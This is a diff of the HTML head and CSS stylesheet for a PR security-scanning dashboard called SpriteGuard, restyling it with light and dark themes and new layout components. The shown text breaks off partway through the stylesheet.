@@ -1,364 +1,1166 @@
 <!doctype html>
-<html lang="en">
+<html lang="en" data-theme="dark">
   <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>SpriteGuard — Zero-Trust PR Security Console</title>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover" />
+    <title>SpriteGuard — Zero-Trust PR Security</title>
     <link
       rel="icon"
       type="image/svg+xml"
-      href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 64 64' fill='none'%3E%3Cdefs%3E%3ClinearGradient id='g' x1='10' y1='8' x2='54' y2='56' gradientUnits='userSpaceOnUse'%3E%3Cstop offset='0%25' stop-color='%236d7cff'/%3E%3Cstop offset='100%25' stop-color='%2322d3ee'/%3E%3C/linearGradient%3E%3C/defs%3E%3Crect x='2' y='2' width='60' height='60' rx='14' fill='%230b1020' stroke='url(%23g)' stroke-width='2.5'/%3E%3Cpath d='M32 10L50 17.5V31.5C50 43.2 42.3 51.3 32 55C21.7 51.3 14 43.2 14 31.5V17.5L32 10Z' fill='%2316203a' stroke='url(%23g)' stroke-width='2.4' stroke-linejoin='round'/%3E%3Cpath d='M32 18V24M32 40V46M20 32H24M40 32H44' stroke='%2338bdf8' stroke-width='2' stroke-linecap='round'/%3E%3Crect x='24' y='24' width='16' height='16' rx='3.5' fill='%23090e1c' stroke='url(%23g)' stroke-width='2'/%3E%3Cpath d='M28.2 32.3L30.9 35L36.2 29.3' stroke='%2310b981' stroke-width='2.6' stroke-linecap='round' stroke-linejoin='round'/%3E%3C/svg%3E"
+      href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none'%3E%3Crect width='24' height='24' rx='5' fill='%230b1220'/%3E%3Cpath d='M8 4H4v16h4' stroke='%23e8eef8' stroke-width='2' stroke-linecap='butt' stroke-linejoin='miter'/%3E%3Cpath d='M16 4h4v16h-4' stroke='%23e8eef8' stroke-width='2' stroke-linecap='butt' stroke-linejoin='miter'/%3E%3Crect x='8.5' y='8.5' width='7' height='7' rx='1.5' fill='%232dd4bf'/%3E%3C/svg%3E"
+    />
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Geist:wght@400;500;600&family=Geist+Mono:wght@400;500&display=swap"
+      rel="stylesheet"
     />
     <style>
       :root {
-        --bg: #07090f;
-        --panel: #0e1320;
-        --panel-2: #141b2d;
-        --border: #202a44;
-        --text: #e6ecf8;
-        --muted: #8b98b8;
-        --accent: #6d7cff;
-        --accent-2: #22d3ee;
-        --green: #10b981;
-        --yellow: #f59e0b;
-        --orange: #f97316;
-        --red: #ef4444;
-        --mono: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace;
-        --sans: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Inter, sans-serif;
+        --bg: #f3f6fb;
+        --pn: #ffffff;
+        --sb: #ebf0f7;
+        --ln: #d9e1ee;
+        --tx: #0a1224;
+        --mu: #4b5a75;
+        --ac: #0f766e;
+        --on: #ffffff;
+        --ar: #0f766e17;
+        --ai: #6d4fd6;
+        --ais: #6d4fd614;
+        --cr: #d92d20;
+        --hi: #b45309;
+        --md: #8a6d05;
+        --ok: #15803d;
+        --ad: #15803d14;
+        --dl: #d92d2012;
+        --r: 8px;
+        --R: 12px;
+        --h: 32px;
+        --m: 'Geist Mono', ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
+        color-scheme: light;
       }
-      * { box-sizing: border-box; }
-      body {
+      :root[data-theme='dark'] {
+        --bg: #060b17;
+        --pn: #0b1220;
+        --sb: #101a2e;
+        --ln: #1a2740;
+        --tx: #e8eef8;
+        --mu: #9aa9c3;
+        --ac: #2dd4bf;
+        --on: #03201c;
+        --ar: #2dd4bf1a;
+        --ai: #a78bfa;
+        --ais: #a78bfa1c;
+        --cr: #ff6b6b;
+        --hi: #f5a524;
+        --md: #e0b84a;
+        --ok: #4ade80;
+        --ad: #4ade8016;
+        --dl: #ff6b6b16;
+        color-scheme: dark;
+      }
+
+      * {
+        box-sizing: border-box;
         margin: 0;
-        background: radial-gradient(circle at 20% -10%, rgba(109, 124, 255, 0.14), transparent 45%), var(--bg);
-        color: var(--text);
-        font-family: var(--sans);
-        line-height: 1.45;
+      }
+      html {
+        scroll-padding-top: env(safe-area-inset-top, 0px);
+      }
+      body {
+        background: var(--bg);
+        color: var(--tx);
+        font: 14px/1.5 Geist, ui-sans-serif, system-ui, -apple-system, 'Segoe UI', sans-serif;
+        font-variant-numeric: tabular-nums;
+        -webkit-font-smoothing: antialiased;
+        padding-top: env(safe-area-inset-top, 0px);
+        padding-bottom: env(safe-area-inset-bottom, 0px);
+        overflow-x: hidden;
+      }
+      code,
+      .mono {
+        font-family: var(--m);
+      }
+      button {
+        font: inherit;
+        color: inherit;
+        background: none;
+        border: 0;
+        cursor: pointer;
+      }
+      :focus-visible {
+        outline: 2px solid var(--ac);
+        outline-offset: 2px;
       }
       .wrap {
-        max-width: 1360px;
+        max-width: 1240px;
         margin: 0 auto;
-        padding: 24px 20px 56px;
+        padding: 0 20px;
       }
-      header {
+
+      /* Sticky Top Header */
+      .top-bar {
+        position: sticky;
+        top: 0;
+        z-index: 30;
+        background: color-mix(in srgb, var(--bg) 88%, transparent);
+        backdrop-filter: blur(8px);
+        border-bottom: 1px solid var(--ln);
+      }
+      .top {
         display: flex;
-        flex-wrap: wrap;
-        gap: 16px;
         align-items: center;
-        justify-content: space-between;
-        padding-bottom: 18px;
-        border-bottom: 1px solid var(--border);
-        margin-bottom: 20px;
+        gap: 10px;
+        min-height: 60px;
+        flex-wrap: wrap;
+        padding-top: 8px;
+        padding-bottom: 8px;
       }
       .brand {
         display: flex;
         align-items: center;
-        gap: 12px;
+        gap: 9px;
+        font-weight: 600;
+        font-size: 15px;
+        letter-spacing: -0.01em;
       }
-      .logo {
-        width: 42px;
-        height: 42px;
-        border-radius: 11px;
-        display: grid;
-        place-items: center;
-        flex-shrink: 0;
-        filter: drop-shadow(0 0 14px rgba(109, 124, 255, 0.35));
-      }
-      .logo svg {
-        width: 42px;
-        height: 42px;
+      .brand-logo {
         display: block;
+        flex-shrink: 0;
       }
-      .brand h1 {
-        margin: 0;
-        font-size: 20px;
-        letter-spacing: -0.02em;
+      .brand-logo #logo-cell {
+        fill: var(--ac);
+        transition: opacity 0.2s ease;
       }
-      .brand p {
-        margin: 2px 0 0;
-        color: var(--muted);
+      .brand-logo #logo-cell-sleeping {
+        display: none;
+      }
+      .brand-logo[data-sprite-state='active'] #logo-cell {
+        fill: var(--ac);
+        animation: sgCellPulse 1.6s ease-in-out infinite;
+      }
+      .brand-logo[data-sprite-state='sleeping'] #logo-cell {
+        display: none;
+      }
+      .brand-logo[data-sprite-state='sleeping'] #logo-cell-sleeping {
+        display: inline;
+      }
+      @keyframes sgCellPulse {
+        0%,
+        100% {
+          opacity: 1;
+        }
+        50% {
+          opacity: 0.55;
+        }
+      }
+      .env {
         font-size: 12px;
-      }
-      .controls {
-        display: flex;
-        flex-wrap: wrap;
-        gap: 8px;
-        align-items: center;
-      }
-      .pill {
+        color: var(--mu);
+        border: 1px solid var(--ln);
+        padding: 2px 9px;
+        border-radius: 99px;
         display: inline-flex;
-        align-items: center;
         gap: 6px;
-        padding: 5px 10px;
-        border-radius: 999px;
-        font-size: 12px;
-        border: 1px solid var(--border);
-        background: var(--panel);
-        color: var(--muted);
+        align-items: center;
+        font-weight: 400;
+        background: var(--pn);
+      }
+      .grow {
+        flex: 1;
       }
       .dot {
-        width: 8px;
-        height: 8px;
+        width: 7px;
+        height: 7px;
         border-radius: 50%;
-        background: var(--green);
-        box-shadow: 0 0 8px var(--green);
+        background: var(--ok);
+        display: inline-block;
+        flex-shrink: 0;
       }
-      .dot.warn { background: var(--yellow); box-shadow: 0 0 8px var(--yellow); }
-      .dot.err { background: var(--red); box-shadow: 0 0 8px var(--red); }
-      .status-bar {
-        display: grid;
-        grid-template-columns: repeat(4, minmax(0, 1fr));
-        gap: 10px;
-        margin-bottom: 20px;
+      .dot.warn {
+        background: var(--hi);
       }
-      @media (max-width: 960px) {
-        .status-bar { grid-template-columns: repeat(2, minmax(0, 1fr)); }
+      .dot.err {
+        background: var(--cr);
       }
-      .status-pill {
-        display: flex;
-        align-items: center;
-        gap: 8px;
-        padding: 8px 12px;
-        border-radius: 10px;
-        background: rgba(14, 19, 32, 0.9);
-        border: 1px solid var(--border);
-        font-size: 12px;
-        color: var(--muted);
-        white-space: nowrap;
-        overflow: hidden;
-        text-overflow: ellipsis;
+      .dot.mu {
+        background: var(--mu);
       }
-      .status-pill strong {
-        color: var(--text);
-        font-weight: 600;
+      .live .dot {
+        animation: pulse 2s infinite;
       }
-      button, select, input {
-        font-family: inherit;
+      @keyframes pulse {
+        50% {
+          opacity: 0.3;
+        }
+      }
+      .btn {
+        min-height: var(--h);
+        height: 32px;
+        padding: 0 12px;
+        border: 1px solid var(--ln);
+        border-radius: var(--r);
+        background: var(--pn);
         font-size: 13px;
-        border-radius: 8px;
-        border: 1px solid var(--border);
-        background: var(--panel-2);
-        color: var(--text);
-        padding: 7px 12px;
-      }
-      button {
-        cursor: pointer;
-        font-weight: 600;
-        transition: border-color 0.15s, background 0.15s, transform 0.05s;
-      }
-      button:hover { border-color: var(--accent); }
-      button:active { transform: translateY(1px); }
-      button.primary {
-        background: linear-gradient(135deg, var(--accent), #4f46e5);
-        border-color: transparent;
-      }
-      button.approve {
-        background: rgba(16, 185, 129, 0.16);
-        border-color: rgba(16, 185, 129, 0.5);
-        color: #6ee7b7;
-      }
-      button:disabled { opacity: 0.5; cursor: not-allowed; }
-      .demo-bar {
-        display: none;
-        align-items: center;
-        justify-content: space-between;
-        flex-wrap: wrap;
-        gap: 12px;
-        background: rgba(34, 211, 238, 0.06);
-        border: 1px solid rgba(34, 211, 238, 0.25);
-        border-radius: 12px;
-        padding: 12px 16px;
-        margin-bottom: 20px;
-      }
-      .demo-bar.visible { display: flex; }
-      .demo-bar .left {
-        font-size: 13px;
-        color: #a5f3fc;
-      }
-      .kpis {
-        display: grid;
-        grid-template-columns: repeat(4, minmax(0, 1fr));
-        gap: 14px;
-        margin-bottom: 22px;
-      }
-      @media (max-width: 900px) {
-        .kpis { grid-template-columns: repeat(2, minmax(0, 1fr)); }
-      }
-      .card {
-        background: var(--panel);
-        border: 1px solid var(--border);
-        border-radius: 14px;
-        padding: 16px 18px;
-      }
-      .kpi-label {
-        font-size: 12px;
-        text-transform: uppercase;
-        letter-spacing: 0.06em;
-        color: var(--muted);
-      }
-      .kpi-value {
-        font-size: 30px;
-        font-weight: 700;
-        margin-top: 6px;
-        letter-spacing: -0.02em;
-      }
-      .kpi-sub {
-        font-size: 12px;
-        color: var(--muted);
-        margin-top: 4px;
-      }
-      .table-card {
-        background: var(--panel);
-        border: 1px solid var(--border);
-        border-radius: 14px;
-        overflow: hidden;
-      }
-      .table-head {
-        display: flex;
-        align-items: center;
-        justify-content: space-between;
-        padding: 14px 18px;
-        border-bottom: 1px solid var(--border);
-      }
-      .table-head h2 {
-        margin: 0;
-        font-size: 15px;
-      }
-      table {
-        width: 100%;
-        border-collapse: collapse;
-        font-size: 13px;
-      }
-      th, td {
-        text-align: left;
-        padding: 12px 14px;
-        border-bottom: 1px solid var(--border);
-        vertical-align: middle;
-      }
-      th {
-        font-size: 11px;
-        text-transform: uppercase;
-        letter-spacing: 0.06em;
-        color: var(--muted);
-        background: rgba(20, 27, 45, 0.7);
-      }
-      tr.scan-row { cursor: pointer; }
-      tr.scan-row:hover { background: rgba(109, 124, 255, 0.06); }
-      .badge {
+        font-weight: 500;
         display: inline-flex;
         align-items: center;
-        gap: 5px;
-        padding: 3px 9px;
-        border-radius: 999px;
-        font-size: 11px;
-        font-weight: 700;
-        letter-spacing: 0.02em;
+        gap: 7px;
+        transition: background 0.15s, border-color 0.15s, transform 0.05s, filter 0.15s;
         white-space: nowrap;
       }
-      .sev-Critical { background: rgba(239, 68, 68, 0.18); color: #fca5a5; border: 1px solid rgba(239, 68, 68, 0.4); }
-      .sev-High { background: rgba(249, 115, 22, 0.18); color: #fdba74; border: 1px solid rgba(249, 115, 22, 0.4); }
-      .sev-Medium { background: rgba(245, 158, 11, 0.18); color: #fcd34d; border: 1px solid rgba(245, 158, 11, 0.4); }
-      .sev-Low { background: rgba(16, 185, 129, 0.16); color: #6ee7b7; border: 1px solid rgba(16, 185, 129, 0.4); }
-      .status-awaiting_approval { background: rgba(245, 158, 11, 0.16); color: #fcd34d; border: 1px solid rgba(245, 158, 11, 0.35); }
-      .status-pushed { background: rgba(16, 185, 129, 0.16); color: #6ee7b7; border: 1px solid rgba(16, 185, 129, 0.35); }
-      .status-clean { background: rgba(34, 211, 238, 0.14); color: #67e8f9; border: 1px solid rgba(34, 211, 238, 0.35); }
-      .status-running, .status-queued { background: rgba(109, 124, 255, 0.18); color: #c7d2fe; border: 1px solid rgba(109, 124, 255, 0.4); }
-      .status-failed, .status-publish_failed { background: rgba(239, 68, 68, 0.16); color: #fca5a5; border: 1px solid rgba(239, 68, 68, 0.35); }
-      .status-needs_review, .status-superseded, .status-closed { background: rgba(139, 152, 184, 0.15); color: #cbd5e1; border: 1px solid rgba(139, 152, 184, 0.3); }
-      .mono { font-family: var(--mono); font-size: 12px; }
-      .muted { color: var(--muted); }
-      .detail-row td {
-        background: #0a0e19;
-        padding: 18px;
+      .btn:hover {
+        background: var(--sb);
+        border-color: color-mix(in srgb, var(--tx) 24%, var(--ln));
       }
-      .tabs {
+      .btn:active {
+        transform: translateY(1px);
+      }
+      .btn:disabled {
+        opacity: 0.55;
+        cursor: not-allowed;
+        transform: none;
+      }
+      .btn.pri {
+        background: var(--ac);
+        border-color: var(--ac);
+        color: var(--on);
+      }
+      .btn.pri:hover {
+        filter: brightness(1.08);
+      }
+      .btn.ai {
+        background: var(--ai);
+        border-color: var(--ai);
+        color: var(--on);
+      }
+      .btn.ai:hover {
+        filter: brightness(1.08);
+      }
+      .btn[aria-busy='true']::before {
+        content: '';
+        width: 8px;
+        height: 8px;
+        border: 1.5px solid currentColor;
+        border-radius: 2px;
+        background: linear-gradient(90deg, currentColor 50%, transparent 50%);
+        animation: sp 0.8s steps(4) infinite;
+      }
+      @keyframes sp {
+        to {
+          transform: rotate(360deg);
+        }
+      }
+      kbd {
+        font: 11px var(--m);
+        border: 1px solid var(--ln);
+        border-bottom-width: 2px;
+        border-radius: 4px;
+        padding: 0 4px;
+        color: var(--mu);
+      }
+      .pri kbd {
+        border-color: #fff4;
+        color: inherit;
+      }
+
+      /* Cards & Getting Started */
+      .card {
+        background: var(--pn);
+        border: 1px solid var(--ln);
+        border-radius: var(--R);
+        overflow: hidden;
+      }
+      .gs {
+        padding: 14px 18px;
+        margin-top: 20px;
+      }
+      .gh {
         display: flex;
-        gap: 8px;
-        margin-bottom: 14px;
-        flex-wrap: wrap;
+        justify-content: space-between;
         align-items: center;
       }
-      .tab-btn {
-        background: var(--panel);
-        color: var(--muted);
+      .gh b {
+        font-weight: 600;
       }
-      .tab-btn.active {
-        background: rgba(109, 124, 255, 0.2);
-        border-color: var(--accent);
-        color: var(--text);
+      .gs ol {
+        list-style: none;
+        padding: 0;
+        margin: 10px 0 0;
+        display: grid;
+        grid-template-columns: repeat(auto-fit, minmax(185px, 1fr));
+        gap: 12px;
+        counter-reset: s;
       }
-      pre {
-        background: #05070d;
-        border: 1px solid var(--border);
-        border-radius: 10px;
-        padding: 12px 14px;
-        overflow-x: auto;
-        font-family: var(--mono);
+      .gs li {
+        counter-increment: s;
+        display: grid;
+        gap: 4px;
+        align-content: start;
+        font-size: 13px;
+        color: var(--mu);
+      }
+      .gs li b {
+        color: var(--tx);
+        font-weight: 500;
+      }
+      .gs li b::before {
+        content: counter(s) '. ';
+        color: var(--ac);
+      }
+      .gs li.done b::before {
+        content: '✓ ';
+      }
+      .gs em {
+        font-style: normal;
         font-size: 12px;
-        max-height: 420px;
-        margin: 0;
+        margin-left: 8px;
+        color: var(--mu);
+        font-weight: 500;
+      }
+      .gs li.done em {
+        color: var(--ok);
+      }
+      .gs li .btn {
+        justify-self: start;
+        margin-top: 4px;
+      }
+
+      /* Playground + On-Demand GitHub PR Scanner */
+      .demo {
+        padding: 14px 18px;
+        margin: 16px 0 0;
+        display: grid;
+        gap: 12px;
+      }
+      .demo-head {
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+        gap: 12px;
+        flex-wrap: wrap;
+      }
+      .demo-head b {
+        font-weight: 600;
+      }
+      .demo-head p {
+        font-size: 12.5px;
+        color: var(--mu);
+        margin-top: 2px;
+      }
+      .seg {
+        display: inline-flex;
+        gap: 2px;
+        background: var(--sb);
+        padding: 2px;
+        border-radius: 7px;
+      }
+      .seg button {
+        padding: 3px 10px;
+        border-radius: 5px;
+        font-size: 12.5px;
+        color: var(--mu);
+        min-height: 26px;
+        transition: background 0.15s, color 0.15s;
+      }
+      .seg button[aria-pressed='true'] {
+        background: var(--pn);
+        color: var(--tx);
+        box-shadow: 0 0 0 1px var(--ln);
+      }
+      .seg i {
+        font-style: normal;
+        margin-left: 5px;
+        opacity: 0.65;
+        font-size: 11.5px;
+      }
+      .demo-pane {
+        display: grid;
+        grid-template-columns: minmax(0, 1fr) minmax(240px, 340px) auto;
+        gap: 12px 16px;
+        align-items: end;
+      }
+      .demo-pane[hidden] {
+        display: none;
+      }
+      .sel {
+        display: grid;
+        gap: 4px;
+        font-size: 12px;
+        color: var(--mu);
+        font-weight: 500;
+      }
+      .sel select {
+        min-height: 36px;
+        background: var(--bg);
+        color: var(--tx);
+        border: 1px solid var(--ln);
+        border-radius: var(--r);
+        padding: 0 10px;
+        font: inherit;
+        font-size: 13px;
+      }
+      .demo .btn.pri {
+        min-height: 36px;
+        padding: 0 16px;
+      }
+      .custom-pane {
+        display: grid;
+        gap: 10px;
+      }
+      .custom-pane[hidden] {
+        display: none;
+      }
+      .preset-row {
+        display: flex;
+        flex-wrap: wrap;
+        gap: 6px;
+        align-items: center;
+      }
+      .preset-row span {
+        font-size: 12px;
+        color: var(--mu);
+      }
+      .preset-chip {
+        font-size: 12px;
+        border: 1px solid var(--ln);
+        background: var(--sb);
+        border-radius: 99px;
+        padding: 3px 10px;
+        color: var(--mu);
+      }
+      .preset-chip:hover {
+        color: var(--tx);
+        border-color: var(--ac);
+      }
+      .custom-fields {
+        display: grid;
+        grid-template-columns: minmax(0, 1fr) 240px;
+        gap: 8px;
+      }
+      .inp {
+        min-height: 34px;
+        border: 1px solid var(--ln);
+        border-radius: var(--r);
+        background: var(--bg);
+        padding: 0 10px;
+        color: var(--tx);
+        font: inherit;
+        font-size: 13px;
+      }
+      .inp:focus,
+      .code-ta:focus {
+        outline: 0;
+        border-color: var(--ac);
+      }
+      .code-ta {
+        width: 100%;
+        min-height: 118px;
+        border: 1px solid var(--ln);
+        border-radius: var(--r);
+        background: var(--bg);
+        padding: 9px 11px;
+        color: var(--tx);
+        font: 12.5px/1.55 var(--m);
+        resize: vertical;
+      }
+      .url-strip {
+        display: flex;
+        gap: 8px;
+        align-items: center;
+        flex-wrap: wrap;
+        padding-top: 12px;
+        border-top: 1px solid var(--ln);
+      }
+      .url-strip label {
+        font-size: 12.5px;
+        font-weight: 500;
+        color: var(--mu);
+        white-space: nowrap;
+      }
+      .url-strip .inp {
+        flex: 1;
+        min-width: 220px;
+      }
+
+      /* KPI Summary Strip */
+      .stats {
+        display: grid;
+        grid-template-columns: repeat(4, 1fr);
+        margin: 18px 0;
+        border: 1px solid var(--ln);
+        border-radius: var(--R);
+        background: var(--pn);
+      }
+      .stats > div {
+        padding: 14px 18px;
+        border-left: 1px solid var(--ln);
+      }
+      .stats > div:first-child {
+        border: 0;
+      }
+      .stats .l {
+        color: var(--mu);
+        font-size: 12px;
+        font-weight: 500;
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+        gap: 6px;
+      }
+      .stats .l em {
+        font-style: normal;
+        font-size: 11px;
+        border: 1px solid var(--ln);
+        padding: 0 6px;
+        border-radius: 99px;
+      }
+      .stats b {
+        display: block;
+        font-size: 26px;
+        font-weight: 600;
+        letter-spacing: -0.02em;
+        line-height: 1.35;
+      }
+      .stats b span {
+        font-size: 13px;
+        font-weight: 400;
+        color: var(--mu);
+      }
+      .stats small {
+        color: var(--mu);
+        font-size: 12.5px;
+      }
+
+      /* Master-Detail Grid */
+      .grid {
+        display: grid;
+        grid-template-columns: minmax(0, 5fr) minmax(0, 6fr);
+        gap: 20px;
+        align-items: start;
+      }
+      .tb {
+        display: grid;
+        gap: 8px;
+        padding: 10px;
+        border-bottom: 1px solid var(--ln);
+      }
+      .tb-row {
+        display: flex;
+        gap: 8px;
+        align-items: center;
+        flex-wrap: wrap;
+      }
+      .q {
+        flex: 1;
+        min-width: 120px;
+        min-height: var(--h);
+        height: 30px;
+        border: 1px solid var(--ln);
+        border-radius: var(--r);
+        background: var(--bg);
+        padding: 0 10px;
+        color: var(--tx);
+        font: inherit;
+        font-size: 13px;
+      }
+      .q:focus {
+        outline: 0;
+        border-color: var(--ac);
+      }
+      .gl {
+        padding: 10px 14px 4px;
+        font-size: 12.5px;
+        color: var(--mu);
+        font-weight: 500;
+        border-top: 1px solid var(--ln);
+      }
+      .row {
+        display: grid;
+        grid-template-columns: 62px minmax(0, 1fr) auto;
+        gap: 12px;
+        padding: 11px 14px;
+        align-items: center;
+        width: 100%;
+        text-align: left;
+        transition: background 0.15s, color 0.15s;
+      }
+      .row + .row {
+        border-top: 1px solid var(--ln);
+      }
+      .row:hover {
+        background: var(--sb);
+      }
+      .row:active {
+        background: var(--ar);
+      }
+      .row:focus-visible {
+        outline-offset: -2px;
+      }
+      .row[aria-selected='true'] {
+        background: var(--ar);
+        box-shadow: inset 2px 0 var(--ac);
+      }
+      .rk {
+        display: flex;
+        flex-direction: column;
+        gap: 3px;
+      }
+      .rk b {
+        font: 500 12.5px var(--m);
+      }
+      .gauge {
+        display: inline-flex;
+        gap: 2px;
+        align-items: flex-end;
+      }
+      .gauge i {
+        width: 4px;
+        height: 12px;
+        border-radius: 1px;
+        background: var(--ln);
+      }
+      .gauge i.on {
+        background: currentColor;
+      }
+      .rt {
+        font-weight: 500;
+        overflow: hidden;
+        text-overflow: ellipsis;
+        white-space: nowrap;
+      }
+      .dm {
+        font-size: 11px;
+        font-weight: 500;
+        padding: 0 6px;
+        border-radius: 4px;
+        border: 1px solid var(--ln);
+        color: var(--mu);
+        margin-right: 6px;
+      }
+      .rm {
+        color: var(--mu);
+        font-size: 12.5px;
+        display: flex;
+        gap: 4px 12px;
+        flex-wrap: wrap;
+      }
+      .sp {
+        width: 9px;
+        height: 9px;
+        display: inline-block;
+        border-radius: 2px;
+        border: 1.5px solid var(--mu);
+        margin-right: 5px;
+        vertical-align: -1px;
+      }
+      .sp.running,
+      .sp.creating,
+      .sp.active {
+        background: var(--ac);
+        border-color: var(--ac);
+        animation: pulse 1.2s infinite;
+      }
+      .sp.sleeping {
+        background: linear-gradient(90deg, var(--mu) 50%, transparent 50%);
+      }
+      .sp.destroyed {
+        opacity: 0.55;
+        background: repeating-linear-gradient(45deg, var(--mu) 0 1.5px, transparent 1.5px 3px);
+      }
+      .chip {
+        font-size: 12px;
+        padding: 1px 9px;
+        border-radius: 99px;
+        border: 1px solid currentColor;
+        white-space: nowrap;
+        background: color-mix(in srgb, currentColor 9%, transparent);
+      }
+      .emp {
+        padding: 28px 20px;
+        color: var(--mu);
+        text-align: center;
+      }
+
+      /* Right Sticky Detail Inspector */
+      .dt {
+        position: sticky;
+        top: 74px;
+      }
+      .dh {
+        padding: 18px 20px;
+        display: flex;
+        gap: 14px;
+        justify-content: space-between;
+        flex-wrap: wrap;
+        align-items: flex-start;
+      }
+      .dh h2 {
+        font-size: 19px;
+        font-weight: 600;
+        letter-spacing: -0.015em;
+        line-height: 1.35;
+      }
+      .crumb {
+        font-size: 12.5px;
+        color: var(--mu);
+      }
+      .acts {
+        display: flex;
+        gap: 8px;
+        flex-wrap: wrap;
+      }
+      .facts {
+        display: grid;
+        grid-template-columns: repeat(3, 1fr);
+        border-top: 1px solid var(--ln);
+      }
+      .facts > div {
+        padding: 12px 20px;
+        border-left: 1px solid var(--ln);
+      }
+      .facts > div:first-child {
+        border: 0;
+      }
+      .facts .l {
+        font-size: 12px;
+        font-weight: 500;
+        color: var(--mu);
+      }
+      .facts b {
+        display: flex;
+        gap: 8px;
+        align-items: center;
+        font-weight: 600;
+        font-size: 16px;
+      }
+      .facts small {
+        color: var(--mu);
+        font-size: 12.5px;
+        display: block;
+      }
+      .sid {
+        display: flex;
+        gap: 8px;
+        align-items: center;
+        padding: 8px 20px;
+        border-top: 1px solid var(--ln);
+        font-size: 12px;
+        color: var(--mu);
+        overflow: hidden;
+      }
+      .sid code {
+        overflow: hidden;
+        text-overflow: ellipsis;
+        white-space: nowrap;
+      }
+      .sid .btn {
+        height: 24px;
+        min-height: 24px;
+        font-size: 12px;
+        padding: 0 8px;
+      }
+      .bn {
+        padding: 9px 20px;
+        border-top: 1px solid var(--ln);
+        border-left: 3px solid var(--hi);
+        background: color-mix(in srgb, var(--hi) 8%, transparent);
+        font-size: 13px;
+        color: var(--mu);
+      }
+      .bn.e {
+        border-left-color: var(--cr);
+        background: color-mix(in srgb, var(--cr) 8%, transparent);
+      }
+      .bn.d {
+        border-left-color: var(--mu);
+        background: var(--sb);
+      }
+      .bn b {
+        color: var(--tx);
+        font-weight: 500;
+        margin-right: 6px;
+      }
+
+      /* Tabs */
+      .tabs {
+        display: flex;
+        gap: 10px;
+        padding: 0 16px;
+        border-top: 1px solid var(--ln);
+        border-bottom: 1px solid var(--ln);
+        overflow-x: auto;
+      }
+      .tabs button {
+        padding: 9px 6px;
+        color: var(--mu);
+        border-bottom: 2px solid transparent;
+        margin-bottom: -1px;
+        white-space: nowrap;
+        transition: color 0.15s, border-color 0.15s;
+      }
+      .tabs button:hover {
+        color: var(--tx);
+      }
+      .tabs button[aria-selected='true'] {
+        color: var(--tx);
+        border-color: var(--ac);
+      }
+      .pane {
+        padding: 16px 20px;
+        max-height: min(50vh, 520px);
+        overflow: auto;
+      }
+
+      /* Overview & Guided Finding Cards */
+      .ov {
+        display: grid;
+        gap: 14px;
+        margin-bottom: 14px;
+        padding: 14px;
+        border: 1px solid var(--ln);
+        border-radius: var(--r);
+        background: var(--sb);
+      }
+      .ovh {
+        display: flex;
+        justify-content: space-between;
+        gap: 8px;
+        font-size: 12.5px;
+        margin-bottom: 6px;
+      }
+      .ovh b {
+        font-weight: 500;
+      }
+      .ovh span {
+        color: var(--mu);
+      }
+      .sb {
+        display: flex;
+        gap: 2px;
+        height: 8px;
+      }
+      .sb i {
+        border-radius: 2px;
+        min-width: 6px;
+      }
+      .cb {
+        display: grid;
+        grid-template-columns: 130px 1fr 34px;
+        gap: 10px;
+        align-items: center;
+        font-size: 12.5px;
+        color: var(--mu);
+        margin-top: 6px;
+      }
+      .cb div {
+        height: 8px;
+        background: var(--ln);
+        border-radius: 2px;
+        overflow: hidden;
+      }
+      .cb i {
+        display: block;
+        height: 100%;
+      }
+      .cb b {
+        font: 500 12px var(--m);
+        color: var(--tx);
+        text-align: right;
+      }
+      details.f {
+        border: 1px solid var(--ln);
+        border-radius: var(--r);
+        margin-bottom: 8px;
+        overflow: hidden;
+      }
+      details.f summary {
+        display: flex;
+        gap: 10px;
+        padding: 10px 12px;
+        cursor: pointer;
+        list-style: none;
+        align-items: center;
+      }
+      details.f summary::-webkit-details-marker {
+        display: none;
+      }
+      details.f[open] .fb {
+        animation: fadeIn 0.18s ease-out;
+      }
+      @keyframes fadeIn {
+        from {
+          opacity: 0;
+          transform: translateY(-3px);
+        }
+      }
+      .sv {
+        width: 3px;
+        align-self: stretch;
+        border-radius: 2px;
+        flex: none;
+      }
+      .ft {
+        font-weight: 500;
+        flex: 1;
+        min-width: 0;
+      }
+      .fl {
+        font: 12px var(--m);
+        color: var(--mu);
+      }
+      .fb {
+        padding: 0 12px 12px 25px;
+        font-size: 13px;
+      }
+      .fb p {
+        margin-top: 7px;
+        color: var(--tx);
+      }
+      .fb p b {
+        display: block;
+        font-size: 12px;
+        color: var(--mu);
+        font-weight: 500;
+        margin-bottom: 1px;
+      }
+      code.ev {
+        display: block;
+        background: var(--sb);
+        padding: 7px 10px;
+        border-radius: 6px;
+        font-size: 12px;
+        overflow: auto;
         white-space: pre-wrap;
         word-break: break-word;
       }
-      .finding-card {
-        border: 1px solid var(--border);
-        background: var(--panel);
-        border-radius: 10px;
-        padding: 12px 14px;
-        margin-bottom: 10px;
-      }
-      .qa-box {
+      .tr {
         display: flex;
-        gap: 8px;
-        margin-top: 12px;
-      }
-      .qa-box input { flex: 1; }
-      .qa-answer {
-        margin-top: 10px;
-        padding: 12px 14px;
-        border-radius: 10px;
-        background: rgba(109, 124, 255, 0.08);
-        border: 1px solid rgba(109, 124, 255, 0.3);
-        font-size: 13px;
-        line-height: 1.55;
-      }
-      .qa-answer.loading {
-        display: flex;
+        gap: 10px;
         align-items: center;
-        gap: 8px;
-        color: #c7d2fe;
-        animation: sg-pulse 1.4s ease-in-out infinite;
+        justify-content: space-between;
+        flex-wrap: wrap;
+        margin-top: 10px;
       }
-      .qa-answer p { margin: 0 0 8px; }
-      .qa-answer p:last-child { margin-bottom: 0; }
-      .qa-answer ul { margin: 4px 0 8px; padding-left: 20px; }
-      .qa-answer li { margin: 3px 0; }
-      .qa-answer code, .gh-body code {
-        font-family: var(--mono);
+      .trs {
+        display: flex;
